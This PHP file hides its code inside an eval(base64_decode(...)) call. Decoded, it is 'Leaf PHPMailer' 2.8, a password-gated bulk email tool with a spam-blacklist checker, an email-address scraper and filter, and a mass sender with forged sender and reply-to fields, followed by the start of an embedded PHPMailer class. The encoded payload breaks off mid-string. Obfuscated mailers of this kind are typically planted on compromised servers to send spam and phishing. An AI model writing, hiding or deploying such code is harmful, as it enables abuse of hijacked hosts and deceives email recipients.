<?php


$password = "";

eval(base64_decode("c2Vzc2lvbl9zdGFydCgpOwplcnJvcl9yZXBvcnRpbmcoMCk7CnNldF90aW1lX2xpbWl0KDApOwppbmlfc2V0KCJtZW1vcnlfbGltaXQiLC0xKTsKCgokbGVhZlsndmVyc2lvbiddPSIyLjgiOwokbGVhZlsnd2Vic2l0ZSddPSJsZWFmbWFpbGVyLnB3IjsKCgokc2Vzc2lvbmNvZGUgPSBtZDUoX19GSUxFX18pOwppZighZW1wdHkoJHBhc3N3b3JkKSBhbmQgJF9TRVNTSU9OWyRzZXNzaW9uY29kZV0gIT0gJHBhc3N3b3JkKXsKICAgIGlmIChpc3NldCgkX1JFUVVFU1RbJ3Bhc3MnXSkgYW5kICRfUkVRVUVTVFsncGFzcyddID09ICRwYXNzd29yZCkgewogICAgICAgICRfU0VTU0lPTlskc2Vzc2lvbmNvZGVdID0gJHBhc3N3b3JkOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgcHJpbnQgIjxwcmUgYWxpZ249Y2VudGVyPjxmb3JtIG1ldGhvZD1wb3N0PlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J3Bhc3MnPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSc+Pic+PC9mb3JtPjwvcHJlPiI7CiAgICAgICAgZXhpdDsgICAgICAgIAogICAgfQp9CgpzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7CgoKZnVuY3Rpb24gbGVhZkNsZWFyKCR0ZXh0LCRlbWFpbCl7CgkkZSA9IGV4cGxvZGUoJ0AnLCAkZW1haWwpOwoJJGVtYWlsdXNlcj0kZVswXTsKCSRlbWFpbGRvbWFpbj0kZVsxXTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstdGltZS1dIiwgZGF0ZSgibS9kL1kgaDppOnMgYSIsIHRpbWUoKSksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstZW1haWwtXSIsICRlbWFpbCwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbHVzZXItXSIsICRlbWFpbHVzZXIsICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstZW1haWxkb21haW4tXSIsICRlbWFpbGRvbWFpbiwgJHRleHQpOwogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21sZXR0ZXJzLV0iLCByYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpLCAkdGV4dCk7CiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbXN0cmluZy1dIiwgcmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5JyksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbnVtYmVyLV0iLCByYW5kU3RyaW5nKCcwMTIzNDU2Nzg5JyksICR0ZXh0KTsKICAgICR0ZXh0ID0gc3RyX3JlcGxhY2UoIlstcmFuZG9tbWQ1LV0iLCBtZDUocmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5JykpLCAkdGV4dCk7CiAgICByZXR1cm4gJHRleHQ7ICAKfQpmdW5jdGlvbiBsZWFmVHJpbSgkc3RyaW5nKXsKCSRzdHJpbmc9dXJsZGVjb2RlKCRzdHJpbmcpOwogICAgcmV0dXJuIHN0cmlwc2xhc2hlcyh0cmltKCRzdHJpbmcpKTsKfQpmdW5jdGlvbiByYW5kU3RyaW5nKCRjb25zb25hbnRzKSB7CiAgICAkbGVuZ3RoPXJhbmQoMTIsMjUpOwogICAgJHBhc3N3b3JkID0gJyc7CiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7CiAgICAgICAgICAgICRwYXNzd29yZCAuPSAkY29uc29uYW50c1socmFuZCgpICUgc3RybGVuKCRjb25zb25hbnRzKSldOwogICAgfQogICAgcmV0dXJuICRwYXNzd29yZDsKfQpmdW5jdGlvbiBsZWFmTWFpbENoZWNrKCRlbWFpbCl7CiAgICBpZiAoZmlsdGVyX3ZhcigkZW1haWwsIEZJTFRFUl9WQUxJREFURV9FTUFJTCkpIHJldHVybiB0cnVlOwogICAgZWxzZSByZXR1cm4gZmFsc2U7Cn0KIyBCdWxpdC1pbiBCbGFja0xpc3QgQ2hlY2tlciAKaWYoaXNzZXQoJF9HRVRbJ2NoZWNrX2lwJ10pKXsKICAgIGlmIChpc3NldCgkX0dFVFsnaG9zdCddKSl7CiAgICAgICAgJF9HRVRbJ2hvc3QnXT1leHBsb2RlKCIsIiwgJF9HRVRbJ2hvc3QnXSk7CiAgICAgICAgZm9yZWFjaCAoJF9HRVRbJ2hvc3QnXSBhcyAkaG9zdCkgewogICAgICAgICAgICBpZiAoY2hlY2tkbnNycigkX0dFVFsnY2hlY2tfaXAnXSAuICIuIiAuICAkaG9zdCAuICIuIiwgIkEiKSkgJGNoZWNrPSAiPGZvbnQgY29sb3I9J3JlZCc+IExpc3RlZDwvZm9udD4iOwogICAgICAgICAgICBlbHNlICRjaGVjaz0gIjxmb250IGNvbG9yPSdncmVlbic+IENsZWFuPC9mb250PiI7CiAgICAgICAgICAgIHByaW50ICdkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiJy4gJGhvc3QuJyIpLmlubmVySFRNTCA9ICInLiRjaGVjay4nIjsnOwogICAgICAgIH0KCiAgICAgICAgZXhpdDsKICAgIH0KICAgICRkbnNibF9sb29rdXAgPSBhcnJheSgKICAgICAgICAiYWxsLnM1aC5uZXQiLAogICAgICAgICJiLmJhcnJhY3VkYWNlbnRyYWwub3JnIiwKICAgICAgICAiYmwuc3BhbWNvcC5uZXQiLAogICAgICAgICJibGFja2xpc3Qud29vZHkuY2giLAogICAgICAgICJib2dvbnMuY3ltcnUuY29tIiwKICAgICAgICAiY2JsLmFidXNlYXQub3JnIiwKICAgICAgICAiY2RsLmFudGktc3BhbS5vcmcuY24iLAogICAgICAgICJjb21iaW5lZC5hYnVzZS5jaCIsCiAgICAgICAgImRiLndwYmwuaW5mbyIsCiAgICAgICAgImRuc2JsLTEudWNlcHJvdGVjdC5uZXQiLAogICAgICAgICJkbnNibC0yLnVjZXByb3RlY3QubmV0IiwKICAgICAgICAiZG5zYmwtMy51Y2Vwcm90ZWN0Lm5ldCIsCiAgICAgICAgImRuc2JsLmFudGljYXB0Y2hhLm5ldCIsCiAgICAgICAgImRuc2JsLmRyb25lYmwub3JnIiwKICAgICAgICAiZG5zYmwuaW5wcy5kZSIsCiAgICAgICAgImRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgImRyb25lLmFidXNlLmNoIiwKICAgICAgICAiZHVpbnYuYXVwYWRzLm9yZyIsCiAgICAgICAgImR1bC5kbnNibC5zb3Jicy5uZXQiLAogICAgICAgICJkeW5hLnNwYW1yYXRzLmNvbSIsCiAgICAgICAgImR5bmlwLnJvdGhlbi5jb20iLAogICAgICAgICJodHRwLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgImlwcy5iYWNrc2NhdHRlcmVyLm9yZyIsCiAgICAgICAgIml4LmRuc2JsLm1hbml0dS5uZXQiLAogICAgICAgICJrb3JlYS5zZXJ2aWNlcy5uZXQiLAogICAgICAgICJtaXNjLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgIm5vcHRyLnNwYW1yYXRzLmNvbSIsCiAgICAgICAgIm9ydmVkYi5hdXBhZHMub3JnIiwKICAgICAgICAicGJsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInByb3h5LmJsLmd3ZWVwLmNhIiwKICAgICAgICAicHNibC5zdXJyaWVsLmNvbSIsCiAgICAgICAgInJlbGF5cy5ibC5nd2VlcC5jYSIsCiAgICAgICAgInJlbGF5cy5uZXRoZXIubmV0IiwKICAgICAgICAic2JsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInNob3J0LnJibC5qcCIsCiAgICAgICAgInNpbmd1bGFyLnR0ay5wdGUuaHUiLAogICAgICAgICJzbXRwLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgInNvY2tzLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgInNwYW0uYWJ1c2UuY2giLAogICAgICAgICJzcGFtLmRuc2JsLmFub25tYWlscy5kZSIsCiAgICAgICAgInNwYW0uZG5zYmwuc29yYnMubmV0IiwKICAgICAgICAic3BhbS5zcGFtcmF0cy5jb20iLAogICAgICAgICJzcGFtYm90LmJscy5kaWdpYmFzZS5jYSIsCiAgICAgICAgInNwYW1yYmwuaW1wLmNoIiwKICAgICAgICAic3BhbXNvdXJjZXMuZmFiZWwuZGsiLAogICAgICAgICJ1YmwubGFzaGJhY2suY29tIiwKICAgICAgICAidWJsLnVuc3Vic2NvcmUuY29tIiwKICAgICAgICAidmlydXMucmJsLmpwIiwKICAgICAgICAid2ViLmRuc2JsLnNvcmJzLm5ldCIsCiAgICAgICAgIndvcm1yYmwuaW1wLmNoIiwKICAgICAgICAieGJsLnNwYW1oYXVzLm9yZyIsCiAgICAgICAgInoubWFpbHNwaWtlLm5ldCIsCiAgICAgICAgInplbi5zcGFtaGF1cy5vcmciLAogICAgICAgICJ6b21iaWUuZG5zYmwuc29yYnMubmV0IiwKICAgICk7CiAgICAkcmV2ZXJzZV9pcCA9IGltcGxvZGUoIi4iLCBhcnJheV9yZXZlcnNlKGV4cGxvZGUoIi4iLCAkX0dFVFsnY2hlY2tfaXAnXSkpKTsKICAgICRkbnNUID0gY291bnQoJGRuc2JsX2xvb2t1cCk7CiAgICBsZWFmaGVhZGVyKCk7CiAgICBwcmludCAnPGRpdiBjbGFzcz0iY29udGFpbmVyIGNvbC1sZy02Ij48aDM+PGZvbnQgY29sb3I9ImdyZWVuIj48c3BhbiBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1sZWFmIj48L3NwYW4+PC9mb250PiBMZWFmIFBIUE1haWxlciA8c21hbGw+QmxhY2tsaXN0IENoZWNrZXI8L3NtYWxsPjwvaDM+JzsKICAgIFByaW50ICJDaGVja2luZyA8Yj4iLiRfR0VUWydjaGVja19pcCddLiI8L2I+IGluIDxiPiRkbnNUPC9iPiAgYW50aS1zcGFtIGRhdGFiYXNlczo8YnI+IjsKICAgICRkbnNOPSIiOwogICAgcHJpbnQgJzx0YWJsZSA+JzsKICAgIGZvciAoJGk9MDsgJGkgPCAkZG5zVDsgJGk9JGkrMTApIHsgCiAgICAgICAgJGhvc3Q9IiI7CiAgICAgICAgJGhvc3RzPSIiOwogICAgICAgIGZvcigkaj0kaTsgJGo8JGkrMTA7JGorKyl7CiAgICAgICAgICAgICRob3N0PSRkbnNibF9sb29rdXBbJGpdOwogICAgICAgICAgICBpZighZW1wdHkoJGhvc3QpKXsKICAgICAgICAgICAgICAgIHByaW50ICI8dHI+IDx0ZD4kaG9zdDwvdGQ+IDx0ZCBpZD0nJGhvc3QnPkNoZWNraW5nIC4uPC90ZD48L3RyPiI7CiAgICAgICAgICAgICAgICAkaG9zdHMgLj0iJGhvc3QsIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkZG5zTi49IjxzY3JpcHQgc3JjPSc/Y2hlY2tfaXA9JHJldmVyc2VfaXAmaG9zdD0iLiRob3N0cy4iJyB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPjwvc2NyaXB0PiI7CiAgICB9CgogICAgcHJpbnQgJzwvdGFibGU+PC9kaXY+JzsKICAgIHByaW50ICRkbnNOOwogICAgZXhpdDsKfQppZihpc3NldCgkX0dFVFsnZW1haWxmaWx0ZXInXSkpewoKICAgIGlmKCFlbXB0eSgkX0ZJTEVTWydmaWxlVG9VcGxvYWQnXVsndG1wX25hbWUnXSkpewogICAgICAgICRfUE9TVFsnZW1haWxMaXN0J109IGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsgCiAgICB9CiAgICAkX1BPU1RbJ2VtYWlsTGlzdCddPXN0cnRvbG93ZXIoJF9QT1NUWydlbWFpbExpc3QnXSk7CiAgIGlmKCRfR0VUWydlbWFpbGZpbHRlciddPT0iaWZyYW0iKXsKICAgICAgICBpZiAoJF9QT1NUWydyZXN1bHR0eXBlJ10gPT0gImRvd25sb2FkIil7CiAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlciIpOyAKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOyAKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1lbWFpbHMiLnRpbWUoKS4iLnR4dCIpOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsKICAgICAgICB9CiAgICBpZigkX1BPU1RbJ3N1Ym1pdCddPT0iZXh0cmFjdCIpewogICAgICAgICRwYXR0ZXJuID0gJy9bQS1aYS16MC05Ll8lKy1dK0BbQS1aYS16MC05Li1dK1wuW0EtWmEtel17Miw0fS8nOwogICAgICAgIHByZWdfbWF0Y2hfYWxsKCRwYXR0ZXJuLCAkX1BPU1RbJ2VtYWlsTGlzdCddLCAkbWF0Y2hlcyk7CiAgICAgICAgZm9yZWFjaCAoJG1hdGNoZXNbMF0gYXMgJGVtYWlsKSB7CiAgICAgICAgICAgIHByaW50ICRlbWFpbC4iCiI7CiAgICAgICAgfQogICAgfQogICAgZWxzZWlmICgkX1BPU1RbJ3N1Ym1pdCddPT0iZmlsdGVyIikgewogICAgICAgICRlbWFpbHM9ZXhwbG9kZSgiCiIsICRfUE9TVFsnZW1haWxMaXN0J10pOwogICAgICAgICRrZXl3b3Jkcz1leHBsb2RlKCIKIiwgc3RydG9sb3dlcigkX1BPU1RbJ2tleXdvcmRzJ10pKTsKICAgICAgICBmb3JlYWNoICgkZW1haWxzIGFzICRlbWFpbCkgewogICAgICAgICAgICBmb3JlYWNoICgka2V5d29yZHMgYXMgJGtleXdvcmQgKSB7CiAgICAgICAgICAgICAgICBpZihzdHJzdHIoJGVtYWlsLCAka2V5d29yZCkgKXsKICAgICAgICAgICAgICAgICAgICBwcmludCAkZW1haWwuIgoiOwogICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgfQogICAgZXhpdDsKICAgfQogICBsZWFmaGVhZGVyKCk7CiAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTQiPjxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD5FbWFpbCBGaWx0ZXI8L3NtYWxsPjwvaDM+JzsKICAgcHJpbnQgJwogICAgPGZvcm0gYWN0aW9uPSI/ZW1haWxmaWx0ZXI9aWZyYW0iIG1ldGhvZD0iUE9TVCIgdGFyZ2V0PSJteS1pZnJhbWUiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG9uc3VibWl0PVwnXCc+CiAgICAgICAgPGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5UZXh0IDwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+IAogICAgICAgIG9yCgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJlbWFpbExpc3QiIGlkPSJlbWFpbExpc3QiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjciIGlkPSJ0ZXh0QXJlYSI+PC90ZXh0YXJlYT4KICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyYWRpbyI+CiAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0icmVzdWx0dHlwZSIgaWQ9InJlc3VsdHR5cGUiIHZhbHVlPSJoZXJlIiBjaGVja2VkPSIiPgogICAgICAgICAgICBTaG93IFJlc3VsdCBpbiB0aGlzIHBhZ2UKICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icmFkaW8iPgogICAgICAgICAgPGxhYmVsPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InJlc3VsdHR5cGUiIGlkPSJyZXN1bHR0eXBlIiB2YWx1ZT0iZG93bmxvYWQiPgogICAgICAgICAgICBEb3dubG9hZCBSZXN1bHQgKGZvciBiaWcgbnVtYmVycykKICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICAgICAgICA8bGVnZW5kPjxoND5FeHRyYWN0IEVtYWlsPC9oND48L2xlZ2VuZD4KICAgICAgICAgICAgRGV0ZWN0aW5nIGV2ZXJ5IGVtYWlsICgxMDAlKSBhbmQgb3JkZXIgdGhlbSBsaW5lIGJ5IGxpbmUgPGJyPjxicj4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iZXh0cmFjdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iPlN0YXJ0PC9idXR0b24+CiAgICAgICAgICAgIDxsZWdlbmQ+PGg0PkZpbHRlciBFbWFpbHM8L2g0PjwvbGVnZW5kPgogICAgICAgIDxsYWJlbCA+S2V5d29yZHMgPHNtYWxsPiBleDogZ21haWwuY29tIG9yIC5jby51azwvc21hbGw+IDwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImtleXdvcmRzIiBpZD0ia2V5d29yZHMiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjQiIGlkPSJ0ZXh0QXJlYSI+Z21haWwuY29tCmhvdG1haWwuY29tCnlhaG9vLmNvbQouY28udWs8L3RleHRhcmVhPjxicj4KCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJmaWx0ZXIiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIj5TdGFydDwvYnV0dG9uPgogICAgPC9mb3JtPgogICAgPGxhYmVsID5SZXN1bHQgPC9sYWJlbD4KICAgIDxpZnJhbWUgc3R5bGU9ImJvcmRlcjpub25lO3dpZHRoOjEwMCU7IiBuYW1lPSJteS1pZnJhbWUiICBzcmM9Ij9lbWFpbGZpbHRlcj1pZnJhbSIgPjwvaWZyYW1lPgogICAnOwogICBleGl0OwoKfQokaHRtbD0iY2hlY2tlZCI7CiR1dGY4PSJzZWxlY3RlZCI7CiRiaXQ4PSJzZWxlY3RlZCI7CgppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIgb3IgJF9QT1NUWydhY3Rpb24nXT09InNjb3JlIil7CgogICAgJHNlbmRlckVtYWlsPWxlYWZUcmltKCRfUE9TVFsnc2VuZGVyRW1haWwnXSk7CiAgICAkc2VuZGVyTmFtZT1sZWFmVHJpbSgkX1BPU1RbJ3NlbmRlck5hbWUnXSk7CiAgICAkcmVwbHlUbz1sZWFmVHJpbSgkX1BPU1RbJ3JlcGx5VG8nXSk7CiAgICAkc3ViamVjdD1sZWFmVHJpbSgkX1BPU1RbJ3N1YmplY3QnXSk7CiAgICAkZW1haWxMaXN0PWxlYWZUcmltKCRfUE9TVFsnZW1haWxMaXN0J10pOwogICAgJG1lc3NhZ2VUeXBlPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZVR5cGUnXSk7CiAgICAkbWVzc2FnZUxldHRlcj1sZWFmVHJpbSgkX1BPU1RbJ21lc3NhZ2VMZXR0ZXInXSk7CiAgICAkZW5jb2RpbmcgPSAkX1BPU1RbJ2VuY29kZSddOwogICAgJGNoYXJzZXQgPSAkX1BPU1RbJ2NoYXJzZXQnXTsKICAgICRodG1sPSIiOwogICAgJHV0Zjg9IiI7CiAgICAkYml0OD0iIjsKCiAgICBpZigkbWVzc2FnZVR5cGU9PTIpICRwbGFpbj0iY2hlY2tlZCI7CiAgICBlbHNlICRodG1sPSJjaGVja2VkIjsKCiAgICBpZigkY2hhcnNldD09IklTTy04ODU5LTEiKSAkaXNvPSJzZWxlY3RlZCI7CiAgICBlbHNlICR1dGY4PSJzZWxlY3RlZCI7CgogICAgaWYoJGVuY29kaW5nPT0iN2JpdCIpICRiaXQ3PSJzZWxlY3RlZCI7CiAgICBlbHNlaWYoJGVuY29kaW5nPT0iYmluYXJ5IikgJGJpbmFyeT0ic2VsZWN0ZWQiOwogICAgZWxzZWlmKCRlbmNvZGluZz09ImJhc2U2NCIpICRiYXNlNjQ9InNlbGVjdGVkIjsKICAgIGVsc2VpZigkZW5jb2Rpbmc9PSJxdW90ZWQtcHJpbnRhYmxlIikgJHF1b3RlZHByaW50YWJsZT0ic2VsZWN0ZWQiOwogICAgZWxzZSAkYml0OD0ic2VsZWN0ZWQiOwoKCgp9CmlmKCRfUE9TVFsnYWN0aW9uJ109PSJ2aWV3Iil7Cgkkdmlld01lc3NhZ2U9bGVhZlRyaW0oJF9QT1NUWydtZXNzYWdlTGV0dGVyJ10pOwoJJHZpZXdNZXNzYWdlPWxlYWZDbGVhcigkdmlld01lc3NhZ2UsInVzZXJAZG9tYWluLmNvbSIpOwoJaWYgKCRfUE9TVFsnbWVzc2FnZVR5cGUnXT09Mil7CgkJcHJpbnQgIjxwcmU+Ii5odG1sc3BlY2lhbGNoYXJzKCR2aWV3TWVzc2FnZSkuIjwvcHJlPiI7Cgl9CgllbHNlIHsKCQlwcmludCAkdmlld01lc3NhZ2U7Cgl9CglleGl0Owp9CgoKCmlmKCFpc3NldCgkX1BPU1RbJ3NlbmRlckVtYWlsJ10pKXsKICAgICRzZW5kZXJFbWFpbD0ic3VwcG9ydEAiLnN0cl9yZXBsYWNlKCJ3d3cuIiwgIiIsICRfU0VSVkVSWydIVFRQX0hPU1QnXSk7CiAgICBpZiAoIWxlYWZNYWlsQ2hlY2soJHNlbmRlckVtYWlsKSkgJHNlbmRlckVtYWlsPSIiOwp9CgpjbGFzcyBQSFBNYWlsZXIKewogICAgLyoqCiAgICAgKiBUaGUgUEhQTWFpbGVyIFZlcnNpb24gbnVtYmVyLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRWZXJzaW9uID0gJzUuMi4yOCc7CgogICAgLyoqCiAgICAgKiBFbWFpbCBwcmlvcml0eS4KICAgICAqIE9wdGlvbnM6IG51bGwgKGRlZmF1bHQpLCAxID0gSGlnaCwgMyA9IE5vcm1hbCwgNSA9IGxvdy4KICAgICAqIFdoZW4gbnVsbCwgdGhlIGhlYWRlciBpcyBub3Qgc2V0IGF0IGFsbC4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFByaW9yaXR5ID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBjaGFyYWN0ZXIgc2V0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDaGFyU2V0ID0gJ2lzby04ODU5LTEnOwoKICAgIC8qKgogICAgICogVGhlIE1JTUUgQ29udGVudC10eXBlIG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIGVuY29kaW5nLgogICAgICogT3B0aW9uczogIjhiaXQiLCAiN2JpdCIsICJiaW5hcnkiLCAiYmFzZTY0IiwgYW5kICJxdW90ZWQtcHJpbnRhYmxlIi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRW5jb2RpbmcgPSAnOGJpdCc7CgogICAgLyoqCiAgICAgKiBIb2xkcyB0aGUgbW9zdCByZWNlbnQgbWFpbGVyIGVycm9yIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEVycm9ySW5mbyA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gZW1haWwgYWRkcmVzcyBmb3IgdGhlIG1lc3NhZ2UuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEZyb20gPSAncm9vdEBsb2NhbGhvc3QnOwoKICAgIC8qKgogICAgICogVGhlIEZyb20gbmFtZSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkRnJvbU5hbWUgPSAnUm9vdCBVc2VyJzsKCiAgICAvKioKICAgICAqIFRoZSBTZW5kZXIgZW1haWwgKFJldHVybi1QYXRoKSBvZiB0aGUgbWVzc2FnZS4KICAgICAqIElmIG5vdCBlbXB0eSwgd2lsbCBiZSBzZW50IHZpYSAtZiB0byBzZW5kbWFpbCBvciBhcyAnTUFJTCBGUk9NJyBpbiBzbXRwIG1vZGUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNlbmRlciA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFJldHVybi1QYXRoIG9mIHRoZSBtZXNzYWdlLgogICAgICogSWYgZW1wdHksIGl0IHdpbGwgYmUgc2V0IHRvIGVpdGhlciBGcm9tIG9yIFNlbmRlci4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBFbWFpbCBzZW5kZXJzIHNob3VsZCBuZXZlciBzZXQgYSByZXR1cm4tcGF0aCBoZWFkZXI7CiAgICAgKiBpdCdzIHRoZSByZWNlaXZlcidzIGpvYiAoUkZDNTMyMSBzZWN0aW9uIDQuNCksIHNvIHRoaXMgbm8gbG9uZ2VyIGRvZXMgYW55dGhpbmcuCiAgICAgKiBAbGluayBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMSNzZWN0aW9uLTQuNCBSRkM1MzIxIHJlZmVyZW5jZQogICAgICovCiAgICBwdWJsaWMgJFJldHVyblBhdGggPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTdWJqZWN0ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBIVE1MIG9yIHBsYWluIHRleHQgbWVzc2FnZSBib2R5LgogICAgICogSWYgSFRNTCB0aGVuIGNhbGwgaXNIVE1MKHRydWUpLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgcGxhaW4tdGV4dCBtZXNzYWdlIGJvZHkuCiAgICAgKiBUaGlzIGJvZHkgY2FuIGJlIHJlYWQgYnkgbWFpbCBjbGllbnRzIHRoYXQgZG8gbm90IGhhdmUgSFRNTCBlbWFpbAogICAgICogY2FwYWJpbGl0eSBzdWNoIGFzIG11dHQgJiBFdWRvcmEuCiAgICAgKiBDbGllbnRzIHRoYXQgY2FuIHJlYWQgSFRNTCB3aWxsIHZpZXcgdGhlIG5vcm1hbCBCb2R5LgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBbHRCb2R5ID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBpQ2FsIG1lc3NhZ2UgcGFydCBib2R5LgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gc2ltcGxlIGFsdCBvciBhbHRfaW5saW5lIG1lc3NhZ2UgdHlwZXMKICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnRzLCB1c2UgdGhlIGJ1bmRsZWQgZXh0cmFzL0Vhc3lQZWFzeUlDUy5waHAgY2xhc3Mgb3IgaUNhbGNyZWF0b3IKICAgICAqIEBsaW5rIGh0dHA6Ly9zcHJhaW4uY2gvYmxvZy9kb3dubG9hZHMvcGhwLWNsYXNzLWVhc3lwZWFzeWljcy1jcmVhdGUtaWNhbC1maWxlcy13aXRoLXBocC8KICAgICAqIEBsaW5rIGh0dHA6Ly9raWdrb25zdWx0LnNlL2lDYWxjcmVhdG9yLwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRJY2FsID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgY29tcGxldGUgY29tcGlsZWQgTUlNRSBtZXNzYWdlIGJvZHkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBoZWFkZXJzLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkTUlNRUhlYWRlciA9ICcnOwoKICAgIC8qKgogICAgICogR